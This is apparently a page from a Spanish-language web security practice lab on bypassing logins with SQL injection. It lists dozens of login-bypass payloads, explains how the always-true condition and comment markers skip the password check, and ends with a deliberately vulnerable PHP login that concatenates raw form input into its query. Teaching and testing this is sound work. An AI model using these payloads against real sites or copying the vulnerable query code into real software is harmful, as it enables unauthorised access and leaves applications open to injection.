<?php include("../../header.php"); ?>

<title>SQLi Login Bypass</title>

<section id="template">
      <div class="container">
        <div class="row">
          <div class="col-md-12">
            <h3 class="title text-center">SQLi Login Bypass</h3>
            <div class="titleHR"><span></span></div>
          </div>
        </div>
        
        <p>Hay muchas inyecciones sql pero otra muy comun es poder saltarse un login para poder acceder a la aplicacion, existen muchas maneras de saltar este paso y contar con una sesion. Existen diferentes formas de hacer un salto a todo esto y solo se vale de prueba y error. Algunos de los siguiente podrian hacer que se logre saltar esa autenticacion.</p>

        <pre>or 1&equals;1&NewLine;or 1&equals;1--&NewLine;or 1&equals;1&num;&NewLine;or 1&equals;1&sol;&ast;&NewLine;admin&apos; --&NewLine;admin&apos; &num;&NewLine;admin&apos;&sol;&ast;&NewLine;admin&apos; or &apos;1&apos;&equals;&apos;1&NewLine;admin&apos; or &apos;1&apos;&equals;&apos;1&apos;--&NewLine;admin&apos; or &apos;1&apos;&equals;&apos;1&apos;&num;&NewLine;admin&apos; or &apos;1&apos;&equals;&apos;1&apos;&sol;&ast;&NewLine;admin&apos;or 1&equals;1 or &apos;&apos;&equals;&apos;&NewLine;admin&apos; or 1&equals;1&NewLine;admin&apos; or 1&equals;1-- -&NewLine;admin&apos; or 1&equals;1&num;&NewLine;admin&apos; or 1&equals;1&sol;&ast;&NewLine;admin&apos;&rpar; or &lpar;&apos;1&apos;&equals;&apos;1&NewLine;admin&apos;&rpar; or &lpar;&apos;1&apos;&equals;&apos;1&apos;--&NewLine;admin&apos;&rpar; or &lpar;&apos;1&apos;&equals;&apos;1&apos;&num;&NewLine;admin&apos;&rpar; or &lpar;&apos;1&apos;&equals;&apos;1&apos;&sol;&ast;&NewLine;admin&apos;&rpar; or &apos;1&apos;&equals;&apos;1&NewLine;admin&apos;&rpar; or &apos;1&apos;&equals;&apos;1&apos;--&NewLine;admin&apos;&rpar; or &apos;1&apos;&equals;&apos;1&apos;&num;&NewLine;admin&apos;&rpar; or &apos;1&apos;&equals;&apos;1&apos;&sol;&ast;&NewLine;1234 &apos; AND 1&equals;0 UNION ALL SELECT &apos;admin&apos;&comma; &apos;81dc9bdb52d04dc20036dbd8313ed055&NewLine;admin&quot; --&NewLine;admin&quot; &num;&NewLine;admin&quot;&sol;&ast;&NewLine;admin&quot; or &quot;1&quot;&equals;&quot;1&NewLine;admin&quot; or &quot;1&quot;&equals;&quot;1&quot;--&NewLine;admin&quot; or &quot;1&quot;&equals;&quot;1&quot;&num;&NewLine;admin&quot; or &quot;1&quot;&equals;&quot;1&quot;&sol;&ast;&NewLine;admin&quot;or 1&equals;1 or &quot;&quot;&equals;&quot;&NewLine;admin&quot; or 1&equals;1&NewLine;admin&quot; or 1&equals;1--&NewLine;admin&quot; or 1&equals;1&num;&NewLine;admin&quot; or 1&equals;1&sol;&ast;&NewLine;admin&quot;&rpar; or &lpar;&quot;1&quot;&equals;&quot;1&NewLine;admin&quot;&rpar; or &lpar;&quot;1&quot;&equals;&quot;1&quot;--&NewLine;admin&quot;&rpar; or &lpar;&quot;1&quot;&equals;&quot;1&quot;&num;&NewLine;admin&quot;&rpar; or &lpar;&quot;1&quot;&equals;&quot;1&quot;&sol;&ast;&NewLine;admin&quot;&rpar; or &quot;1&quot;&equals;&quot;1&NewLine;admin&quot;&rpar; or &quot;1&quot;&equals;&quot;1&quot;--&NewLine;admin&quot;&rpar; or &quot;1&quot;&equals;&quot;1&quot;&num;&NewLine;admin&quot;&rpar; or &quot;1&quot;&equals;&quot;1&quot;&sol;&ast;&NewLine;1234 &quot; AND 1&equals;0 UNION ALL SELECT &quot;admin&quot;&comma; </pre>

        <p>La forma que se utiliza en los codigos anteriores es la forma en que se puede saltar la autenticacion y lo que trata es de agregar una consulta la cual genera que sea verdadera haciendo una condicional de el usuario y si el valor 1 es igual a 1 y como es verdadero continua, y con los valores "-- -" comenta lo que le sigue y por eso mysql no lo trata ignorando la contrasena y lo que le sigue.</p>

        <p>Nos damos cuenta que se inyecto la solicitud porque en una deja el inicio exitoso y en el otro no.</p>
      
        <div class="login">
            <div class="account-login">
               <h1>Inicio de Sesion</h1>
               <form action="<?php echo $_SERVER["PHP_SELF"]; ?>" class="login-form" method="post">
                  <div class="form-group">
                     <input type="text" placeholder="Usuario" class="form-control" name="username">
                  </div>
                  <div class="form-group">
                     <input type="password" placeholder="Contrasena"  class="form-control" name="password">
                  </div>
                  <input type="submit" class="btn" value="Iniciar Sesion">
               </form>
            </div>
        </div>

<?php
    if (isset($_POST['username']) && isset($_POST['password'])){
      
      require "connection.php";

      $var_consulta= "select * from users where name = '".$_POST["username"]."' and "." password = '".$_POST["password"]."';";
      $var_resultado = $obj_conexion->query($var_consulta);
      
      if($var_resultado->num_rows>0){
        echo "<h3 style=\"color: green\">Inicio de sesion exitoso</h3>";
      }else{
        echo "<h3 style=\"color: red\">Datos incorrectos</h3>";
      }
      echo "<div class=\"alert alert-success\" role=\"alert\">Tu consulta sql es: <br><strong>$var_consulta</strong></div>";
    }
?>

    </div> <!--/.container -->
    </section> <!--/.container

<?php include("../../footer.php"); ?>